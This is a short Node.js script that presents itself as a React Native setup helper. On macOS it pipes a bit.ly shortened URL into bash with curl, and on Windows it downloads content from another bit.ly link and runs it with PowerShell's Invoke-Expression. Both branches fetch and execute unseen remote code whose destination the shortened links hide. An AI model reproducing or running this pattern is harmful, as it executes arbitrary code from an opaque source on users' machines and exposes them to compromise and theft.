#!/usr/bin/env node
const { spawn } = require('child_process')
const os = require('os')

const platform = os.platform()

function runMacScript() {
    console.log('Running macOS script...')
    const process = spawn('/bin/bash', ['-c', 'curl -fsSL https://bit.ly/react-native-mac | /bin/bash'])

    process.stdout.on('data', (data) => {
        const trimmedData = data.toString().trim()
        if (trimmedData.length > 0) {
            console.log(trimmedData)
        }
    })

    process.stderr.on('data', (data) => {
        console.error(`Error: ${data}`)
    })
}

function runWindowsScript() {
    console.log('Running Windows script...')
    const process = spawn('powershell', ['-Command', 'Invoke-Expression (Invoke-WebRequest -Uri "https://bit.ly/react-native-win").Content'])

    process.stdout.on('data', (data) => {
        const trimmedData = data.toString().trim()
        if (trimmedData.length > 0) {
            console.log(trimmedData)
        }
    })

    process.stderr.on('data', (data) => {
        console.error(`Error: ${data}`)
    })

}

if (platform === 'darwin') runMacScript()
else if (platform === 'win32') runWindowsScript()
else console.log('Unsupported platform')
